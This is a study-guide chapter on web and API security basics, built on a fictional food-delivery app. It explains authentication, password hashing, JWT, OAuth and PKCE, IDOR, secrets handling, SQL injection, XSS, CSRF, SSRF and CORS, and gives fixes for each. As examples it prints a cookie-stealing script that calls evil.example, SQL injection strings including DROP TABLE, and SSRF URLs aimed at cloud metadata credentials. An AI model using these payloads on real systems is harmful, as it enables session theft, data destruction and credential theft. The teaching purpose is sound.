# 15 — Security basics
*Why it matters:* every design review asks how users log in, how services prove identity, what
stops user 7 reading user 8's data, and where secrets live; half-right answers are worse than "I'd check".

## Authentication vs authorization
**How it works** · **Authentication (authn)** = who are you? (password, token, certificate).
**Authorization (authz)** = may this identity do this action on this resource?

**Example** · Three calls to `GET /v1/orders/o_90311` (Asha's order). No or expired token ->
**401 Unauthorized** (really "not authenticated"). Asha's token (`sub: u_1842`), and
`o_90311.user_id = u_1842` -> 200. Another user's valid token: authn passes, ownership fails ->
**403 Forbidden**, or **404** to hide that the order exists. So: broken authorization, not
broken login, is one of the most common real bugs.

## Storing passwords
**How it works** · Assume the user table leaks someday (people reuse passwords). **Plaintext**
exposes all; **encryption** keeps the key near the data and passwords never need decrypting. A
**salt** is a random per-user value (e.g. 16 bytes) beside the hash, not secret. A **slow
password hash** has a tunable **work factor** (~50-250 ms per login).

**Example** · Asha and another user both choose `biryani123`; the table leaks.
```text
SHA-256, no salt:   both rows hold the same hash -> one rainbow table cracks both
SHA-256 + salt:     different hashes, no precomputed tables, but a GPU still tries
                    billions of guesses/s: a 1-billion-word list takes ~1 s per user
Argon2id ~100 ms:   1e9 guesses x 0.1 s = 1e8 s ≈ 3 years per user, per core
stored string:      $argon2id$v=19$m=65536,t=3,p=1$<salt>$<hash>
```
So: "SHA-256 + salt" is not enough: salt stops shared tables, only a slow hash stops guessing.
**bcrypt** (cost doubles per +1; battle-tested; first 72 bytes only), **scrypt** (**memory-hard**:
GPU/ASIC cracking far costlier), **Argon2id** (tunable time, memory, parallelism; common first
pick). Stored parameters let you raise cost later (rehash on login); compare in constant time;
optional **pepper** (secret outside the DB); plus rate limits, MFA, breached-password checks.

## Sessions vs tokens (JWT)
**How it works** · **Server-side session**: random **session ID** (128+ bits) maps to
`{user_id, expiry}` in Redis/DB, sent as `Set-Cookie: sid=...; HttpOnly; Secure; SameSite=Lax`
(**HttpOnly**: no JS access; **Secure**: HTTPS only; **SameSite**: limits cross-site sending).
Instant revocation, but a per-request lookup on a store that must stay up. A **bearer token**
works for whoever holds it; a **JWT** (`header.payload.signature`, base64url) is verified **locally**.

**Example** · Asha's mobile app after OTP login, decoded JWT:
```text
header   {"alg":"RS256","kid":"k1"}
payload  {"iss":"https://auth.quickbite.com","sub":"u_1842","aud":"orders-api",
          "iat":1791712020,"exp":1791712920,"scope":"orders:write"}   exp - iat = 15 min
sig      RS256 over header.payload with auth's private key; order-service verifies
         with the public key from JWKS: no call to auth, no session lookup
```
So: anyone can decode it: **signed, not encrypted** (no secrets or sensitive PII inside).
**HS256** = one shared secret (every verifier could forge); **RS256/ES256** = private key signs,
public key verifies; preferred. Verify with an **allowlisted algorithm** (libraries were tricked
by `"alg":"none"`, or RS256 checked as HS256 keyed with the public key), then `exp`, `iss`, `aud`.

**Example** · **Revocation problem**: a JWT works until `exp`, even after logout or theft (a `jti`
**denylist** or per-user "invalid before T" need a lookup). Fix: short access + rotating refresh.
```text
09:00  login -> access A1 (exp 09:15) + refresh R1
09:16  GET /v1/orders with A1 -> 401 expired
09:16  POST /token {R1} (only to auth) -> A2 + R2; R1 now invalid
10:00  attacker replays stolen R1 -> reuse detected: two holders -> revoke R2 chain
       Asha logs in again; "log out everywhere" works the same way: revoke refresh
       tokens, every access token dies within <= 15 min
```

## OAuth 2.0, OpenID Connect, SSO
**How it works** · **OAuth 2.0** is **delegated authorization**: an app gets limited **scopes**
on your data without your password, revocable later. Roles: **resource owner** (you), **client**
(the app), **authorization server** (login, consent, tokens), **resource server** (the API).

**Example** · A fitness app ("client") wants to read Asha's QuickBite order history.
```text
1 client makes code_verifier v (random), code_challenge = BASE64URL(SHA256(v))
2 browser -> auth.quickbite.com/authorize?response_type=code&scope=orders.read
            &state=xyz&code_challenge=...&code_challenge_method=S256
3 Asha logs in AT auth.quickbite.com and approves "read your orders"
4 browser -> client callback ?code=AUTH_CODE&state=xyz   (client checks state == xyz)
5 client --back channel POST /token {code, v}--> auth checks SHA256(v) == challenge
6 auth -> client: access token (scope orders.read) + refresh token
7 client -> api.quickbite.com GET /v1/orders, Bearer token -> history; no POST allowed
```
So: the password never touches the client; the browser sees only a one-time **code**; tokens go
by back channel; **state** stops login CSRF; scopes cap damage. Also **client credentials**
(machine-to-machine), **device code** (TVs, CLIs); **implicit**, **password grant** discouraged.

> **Black box:** **PKCE** (steps 1, 5): only the hash of `code_verifier` crosses the browser;
> redeeming needs the verifier. **Use when:** always with the code flow (web, mobile, SPA).
> **Cost:** negligible; a stolen code alone becomes useless.

**OIDC** adds **authentication**: with the `openid` scope the **OpenID provider** also returns
an **ID token**, a JWT saying who the user is (`sub`, `iss`, `aud` = your client, `nonce`).

**Example** · Asha taps "Sign in with <provider>" on QuickBite: the ID token has `aud:
quickbite-web`; QuickBite checks signature, `aud`, `nonce`, then maps `sub` to `u_1842`. A raw
access token is never login proof (one issued to another app could be replayed). OAuth: "what may
this app access?" (audience = API); OIDC: "who is this user?" (audience = client). **SSO**: log in
once at an **identity provider (IdP)** via OIDC or XML **SAML**; one place for MFA and offboarding.

## API keys and service-to-service auth
**How it works** · An **API key** identifies an application, not a user: 128+ random bits, only
a **hash** stored (fast hash is fine for long random keys), shown once, scoped, rotatable, with
quotas; sent in a header, **never in URLs** and never shipped in mobile apps or browser JS.
Internally, **zero trust**: "on the internal network" is not enough.

**Example** · Two callers of QuickBite APIs.
1. A catering partner's `sk_live_8f3b...` (only its hash stored) is pushed to a public repo; a
   scanner spots the `sk_live_` prefix within minutes -> revoke, issue a new key.
2. `order-service` calls `payment-service /charge` over **mTLS**, its certificate saying
   `spiffe://prod/order-service` (auto-rotated by the mesh). Policy: only order-service may
   call `/charge`; `rider-service` trying it gets 403. The call also carries Asha's token, so
   payment knows "order-service, on behalf of u_1842". Short-lived **signed tokens** (client
   credentials, workload identity) can replace or complement mTLS.

## Authorization models and IDOR
**How it works** · **RBAC**: permissions on roles, roles on users; auditable, but fine-grained
rules cause **role explosion**. **ABAC**: rules over attributes, often in a central **policy
engine**; flexible, harder to audit. **ReBAC**: a relationship graph (member of team that owns
folder containing doc), common in document sharing.

**Example** · QuickBite's internal tools and one classic bug.
1. RBAC: Spice Route staff are `viewer` (see orders) or `manager` (edit menu) for `r_77`.
2. ABAC: allow refund if `user.team == "support"` and `refund.amount <= user.approval_limit`
   (₹500), so a ₹450 refund on `o_90311` passes.
3. **IDOR**: user `u_5003` calls `GET /v1/orders/o_90311` with their own valid token and gets
   Asha's address (the handler only checked login); walking o_90312, o_90313 ... dumps all.
```sql
SELECT * FROM orders WHERE order_id = ? AND user_id = ?;  -- user_id from the token
```
So: scope by the token's identity on every endpoint (update, delete, export, bulk), centrally
(data-access layer or row-level security). UUIDs make guessing harder; **not** an access check.

## Encryption, keys and secrets
**How it works** · **TLS** in transit (stops eavesdropping and tampering, CA-authenticated
server), public and increasingly internal; re-encrypt after LB termination on untrusted networks.
**At rest**: disk/storage level or **field-level** in the app. **Secrets** never in code or git:
a **secrets manager**, injected at runtime via the app's identity, **rotated**, never logged.

**Example** · Protecting Asha's phone number and the orders DB password.
1. A snapshot lands in the wrong bucket: disk-level encryption makes it unreadable, but
   `SELECT phone FROM users` on the live DB still shows plaintext.
2. Field-level: `user-service` encrypts `phone` itself; DB readers see ciphertext, but
   `WHERE phone = ...` lookups and indexes no longer work directly.
3. `order-service` fetches its DB password at startup with its own identity (better: a vault
   DB user valid for one hour). Committed to git, it would live in history forever.

> **Black box:** **KMS/HSM + envelope encryption**: encrypt data locally with a random data key
> (DEK); the KMS wraps the DEK with a master key (KEK) that never leaves it; store ciphertext plus
> wrapped DEK. **Use when:** encrypting at scale. **Cost:** a KMS call to unwrap; KEK rotation
> re-encrypts only DEKs, and revoking KMS access makes the data unreadable.

## SQL injection
**How it works** · Concatenated queries turn input into **code**. Fix: **parameterized queries**
(structure and values sent separately, so values are always data).

**Example** · Lookup by phone at login.
```text
code:   "SELECT * FROM users WHERE phone = '" + phone + "'"
input:  ' OR '1'='1          -> ... WHERE phone = '' OR '1'='1'   returns every user
input:  '; DROP TABLE users; --   -> a second statement drops the table
fixed:  SELECT * FROM users WHERE phone = ?    (bound value: just a strange phone number)
sort:   ?sort=rating -> allowlist {rating, price} -> ORDER BY rating; else reject
```
So: ORMs parameterize unless you use raw interpolation; identifiers (table, column, sort
direction) cannot be parameters, so **allowlist** them. Hand escaping is fragile. Same class
(command, LDAP, NoSQL, template injection), same cure: separate code from data.

## XSS and CSRF
**How it works** · **XSS** abuses trust in user content: attacker JS runs in a victim's browser
on your site, with your site's privileges. **CSRF** abuses trust in cookies: another site makes
the victim's browser send an authenticated request.

**Example** · Two attacks on quickbite.com:
1. XSS: a review on `r_77` holds `<script>fetch('https://evil.example/?c='+document.cookie)
   </script>`. Rendered raw, every visitor runs it; escaped, it shows as `&lt;script&gt;` text;
   a CSP blocks inline scripts anyway; an HttpOnly `sid` is unreadable to it.
2. CSRF: logged-in Asha visits evil.example, which auto-submits `POST /account/phone` to
   quickbite.com. Without SameSite her cookie rides along and the number changes (no response
   needed); with `SameSite=Lax` the cookie is not sent on that cross-site POST -> 401.
So: XSS is **stored**, **reflected** or **DOM-based**; prevent with **context-aware output
encoding** (danger: `innerHTML`, raw-HTML helpers), an allowlist sanitizer, **CSP**, **HttpOnly**
(limits, does not prevent, damage). CSRF: **SameSite** (set explicitly though Chromium defaults
to Lax), **anti-CSRF tokens**, no state changes on GET; `Authorization`-header APIs are immune.

## SSRF and broken access control
**How it works** · **SSRF**: a "fetch this URL" feature (import, webhooks, previews, PDF render)
is aimed inside; your server becomes a proxy into a trusted network.

**Example** · `restaurant-service` lets Spice Route "import menu photo from URL".
```text
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    -> cloud metadata may return role credentials -> BLOCK (link-local / metadata range)
url=http://localhost:8080/admin, http://10.0.3.17:6379 (internal Redis) -> BLOCK (private)
url=http://img.evil.example -> resolves 93.184.216.34 at check, 10.0.3.17 at connect
    (DNS rebinding) -> check the IP actually connected to, and every redirect
```
So: allowlist destinations; else block private, loopback, link-local, metadata ranges at connect
time; fetch via an isolated egress proxy; token-protect metadata; no raw content or errors back.

**Broken access control** (top of vulnerability rankings): IDOR, admin endpoints hidden only in
the UI, **mass assignment** (`PATCH /v1/users/u_1842 {"role":"admin"}` bound straight to the
model; fix: field allowlists), checks on GET but not PUT/DELETE/export, trusting a client
`X-User-Id`. **Deny by default**, enforce on the server, centralize, test cross-user access.

## CORS, done right
**How it works** · The **same-origin policy** (origin = scheme + host + port) lets a script on
evil.example **send** to another site but not **read** the response. **CORS** lets a server tell
the browser which other origins may read. Non-simple requests (`PUT`, `DELETE`, JSON body, custom
headers) first send a **preflight** `OPTIONS`.

**Example** · `https://app.quickbite.com` calls `https://api.quickbite.com`.
```text
OPTIONS /v1/cart/items/3   Origin: https://app.quickbite.com
                           Access-Control-Request-Method: DELETE
204  Access-Control-Allow-Origin: https://app.quickbite.com   (allowlisted, not reflected)
     Access-Control-Allow-Methods: GET, POST, DELETE   Access-Control-Max-Age: 600
evil.example script GETs /v1/me with credentials -> no matching header -> browser hides
     the response from the script (the request itself still happened)
curl -H "Authorization: Bearer <stolen token>" /v1/me -> 200: CORS never applied
```
So: CORS is **browser**-enforced and only **relaxes** SOP; the API still authenticates and
authorizes everything; **not CSRF protection**. Pitfall: reflecting any `Origin` with
`Allow-Credentials: true` lets every site read users' data (browsers refuse `*` with credentials).

## Input validation, least privilege, DDoS
**How it works** · All input is untrusted (bodies, headers, files, webhooks, internal messages,
user-originated DB data): validate **on the server** with **allowlists** (type, length, range,
format, enum) and size limits. **Least privilege** limits **blast radius** (**defense in depth**).

**Example** · `POST /v1/orders` and the service behind it.
1. Validation rejects `quantity: -3`, a 10,000-item array, a 5 MB body, deeply nested JSON;
   a note from "O'Brien" is valid and still needs parameters and output encoding.
2. `order-service`'s DB user may SELECT/INSERT/UPDATE its own tables only, so an injected
   `DROP TABLE` fails. Also: non-root read-only containers, one bucket per role,
   just-in-time logged admin access, tight network policies.

> **Black box:** **DDoS**: volumetric (UDP floods, DNS/NTP amplification), protocol (SYN floods),
> application (costly HTTP like search, login), absorbed outside-in by anycast/CDN, scrubbing,
> **WAF**, gateway rate limits, app shedding, behind a hidden origin. **Use when:** any public
> service. **Cost:** you cannot out-provision a big flood; buy edge capacity, keep a runbook.

## Audit logs and PII
**How it works** · An **audit log** records actor, IP, action, resource, result, request ID,
**tamper-resistant** (append-only, separate system even admins cannot edit). **PII** identifies a
person directly or in combination (birth date + postcode + gender); laws like GDPR apply.

**Example** · A support agent opens Asha's phone number for `o_90311`.
```text
{"ts":"2026-10-10T20:41:03Z","actor":"support:agent_42","actor_ip":"203.0.113.9",
 "action":"order.view_phone","resource":"o_90311","result":"success",
 "request_id":"r-5f2c"}
UI shows ******3210 (masked) until the agent clicks "reveal" (the logged action)
analytics sees user "p_9a1f" (pseudonym), never u_1842's name or phone
deletion request -> user, order, notification services, logs, caches; backups age out
card number? never stored: the payment provider holds it (PCI DSS)
```
So: audit logins, role/key/admin changes, sensitive access, exports, deletions; consistent,
retained, secret-free, alerted on. PII: **minimize**, TTLs, find/delete/export everywhere,
classify, encrypt (field-level for the most sensitive), **pseudonymize**, **mask**, **residency**.

## In one minute
- Authn = who (401); authz = may they (403); scope every access by the token's owner (IDOR).
- Passwords: per-user salt + slow hash (Argon2id, scrypt, bcrypt), never plain SHA-256.
- Sessions revoke instantly; JWTs are signed not encrypted, so short access + rotating refresh.
- OAuth = delegated authz (code flow + PKCE, state, scopes); OIDC adds the ID token; SSO via an IdP.
- API keys hashed and out of URLs; zero trust inside with mTLS and/or signed tokens.
- SQLi -> parameters; XSS -> encoding + CSP; CSRF -> SameSite + tokens; SSRF -> block internal ranges.
- CORS is browser-only; allowlist input, least privilege, layered DDoS, audit logs, minimal PII.

## Go deeper
Full chapter 15: sections 15.2 (password storage), 15.3 (sessions vs JWT), 15.4 (OAuth/OIDC), 15.12 (CORS)
